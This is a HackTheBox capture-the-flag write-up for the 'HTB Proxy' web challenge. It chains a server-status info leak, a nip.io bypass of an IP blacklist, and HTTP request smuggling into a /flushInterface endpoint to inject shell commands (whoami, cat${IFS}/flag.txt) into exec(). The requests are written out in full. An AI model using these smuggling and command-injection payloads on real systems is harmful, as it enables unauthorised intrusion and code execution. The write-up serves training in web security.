# HackTheBox CTF Writeup - HTB Proxy

Upon spawning the Docker, I was greeted with a simple landing page. Since it didn’t contain anything, I immediately began reviewing the code.	

### Reviewing the Code

Upon checking the code, I found

```js
if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
    var serverInfo string = GetServerInfo()
    var responseText string = okResponse(serverInfo)
    frontendConn.Write([]byte(responseText))
    frontendConn.Close()
    return
}
```

Which meant that if the request URL matches these bytes, which decodes to server-status, it would write the server info. The server info is a big clue, since the GetServerInfo function it calls prints the IP address of the backend (note that it changes for every Docker session).

```
http://83.136.255.53:39189/server-status gave the following message:
Hostname: ng-team-285517-webhtbproxybiz2024-acjbj-7ff98d58d8-ckht5, Operating System: linux, Architecture: amd64, CPU Count: 4, Go Version: go1.21.10, IPs: 192.168.96.101
```

Using Burp Suite’s Repeater feature, we can send a request to some invalid path and expect a 404. 

Request:
```
GET /invalid HTTP/1.1
Host: 192.168.96.101:5000
```

Response:
```
HTTP/1.1 400 Bad Request
Server: HTB proxy
Content-Length: 12


Invalid host
```
But wait! Why do we get an invalid host?

### Bypassing Blacklist Check

Upon further inspection of the code, I concluded that there was a high chance the IP (192.168.96.101) is being 
blacklisted by the blacklistCheck function.


```js
func blacklistCheck(input string) bool {
    var match bool = strings.Contains(input, string([]byte{108, 111, 99, 97, 108, 104, 111, 115, 116})) ||
        strings.Contains(input, string([]byte{48, 46, 48, 46, 48, 46, 48})) ||
        strings.Contains(input, string([]byte{49, 50, 55, 46})) ||
        strings.Contains(input, string([]byte{49, 55, 50, 46})) ||
        strings.Contains(input, string([]byte{49, 57, 50, 46})) ||
        strings.Contains(input, string([]byte{49, 48, 46}))

    return match
}
```

This checks if the string contains “localhost”, “0.0.0.0”, “127.”, “172.”, “192.”, “10.”. Notice the dot behind the last 4 numbers. Since they are checking if the string literally contains a “127” followed by a full stop, we can bypass this by using nip.io, which changes the URL to 192-168-96-101.nip.io, bypassing the blacklist function as it contains dashes. As I expected, I got the 404 I was looking for.

Request:
```
GET /invalid HTTP/1.1
Host: 192-168-96-101.nip.io:5000
```

Response:
```
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Length: 146


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /invalid</pre>
</body>
</html>
```

Now that I’ve found a way to bypass the blacklist system, I turned my attention to the flushInterface endpoint.

### Request Smuggling and Command Injection with flushInterface

```js
app.post("/flushInterface", validateInput, async (req, res) => {
    const { interface } = req.body;

    try {
        const addr = await ipWrapper.addr.flush(interface);
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error flushing interface"});
    }
});
```

If we look at the ipWrapper source code, we find that the flush executes a command in the backend. 

```js
function flush(interfaceName) {
    return new Promise((resolve, reject) => {
        exec(`ip address flush dev ${interfaceName}`, (error, stdout, stderr) => {
            if (stderr) {
                if(stderr.includes('Cannot find device')) {
                    reject(new Error('Cannot find device ' + interfaceName));
                } else {
                    reject(new Error('Error flushing IP addresses: ' + stderr));
                }
                return;
            }

            resolve();
        });
    });
}
```

This behaviour enables HTTP request smuggling, where a second /flushInterface request is injected into the same HTTP connection. The backend Express server processes this request and executes arbitrary commands due to unsanitised input being passed to exec().

Request:
```
POST /invalid HTTP/1.1
Host: 192-168-96-101.nip.io:5000
Content-Length: 1

a

POST /flushInterface
Content-Type: application/json
Content-Length: 56

{"interface": ";whoami>/app/proxy/includes/index.html;"}
```
Response:
```
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Type: text/html; charset=utf-8


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /invalid</pre>
</body>
</html>
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 38

{"message":"Error flushing interface"}
```

(Notice that I am channeling the `whoami` output into the index.html. Since the frontend serves `/app/proxy/includes/index.html` as the root page, redirecting command output to this file allows the result to be retrieved via a normal GET request. The interface flushing error was expected as I was not feeding a correct interface, but rather smuggling a `whoami` command)

Then, if we send a GET request to /:

Request:
```
GET / HTTP/1.1
Host: 83.136.249.34:43317
```

Response:
```
HTTP/1.1 200 OK
Server: HTB proxy

root
```
We can get the output of the command! 

### Finding the Flag
To find the flag, we just run the command `cat /flag.txt` as the flag is commonly located at /flag.txt in HTB containers. However, note that there is a space between cat and /flag.txt, which will cause errors in the request, so I used ${IFS} instead of the space, and that fixed the issue.

Request:
```
POST /invalid HTTP/1.1
Host:  192-168-96-101.nip.io:5000
Content-Length: 1

a

POST /flushInterface
Content-Type: application/json
Content-Length: 68

{"interface": ";cat${IFS}/flag.txt>/app/proxy/includes/index.html;"}
```

Second Request:
```
GET / HTTP/1.1
Host: 83.136.249.34:43317
```

Response of Second Request:
```
HTTP/1.1 200 OK
Server: HTB proxy

HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_2883f6b4a417f07e9ad36c559c0d7863}
```

And we have the flag!





 







